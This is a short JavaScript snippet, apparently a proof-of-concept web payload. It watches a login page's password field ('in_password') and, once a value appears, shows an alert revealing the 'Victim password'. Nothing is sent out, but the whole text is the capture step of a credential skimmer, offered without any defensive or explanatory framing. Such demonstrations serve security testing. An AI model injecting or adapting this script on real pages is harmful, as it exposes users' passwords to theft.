
let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('in_password')[0];

    if (input1.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert('Victim password: '+document.getElementsByName('in_password')[0].value);
         
        }, 3000); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementsByName('in_password')[0].addEventListener('input', checkInputs);
